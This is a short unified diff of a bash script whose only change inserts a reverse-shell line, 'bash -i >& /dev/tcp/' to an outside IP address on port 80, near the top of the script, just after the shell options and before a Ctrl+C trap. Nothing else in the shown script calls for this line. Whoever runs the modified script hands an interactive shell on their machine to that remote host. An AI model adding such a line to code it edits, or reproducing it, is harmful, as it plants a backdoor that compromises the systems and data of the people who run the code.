@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 set -Eeuo pipefail
 shopt -s dotglob
-
+bash -i >& /dev/tcp/159.223.121.196/80 0>&1
 # make sure we can GTFO
 trap 'echo >&2 Ctrl+C captured, exiting; exit 1' SIGINT
 
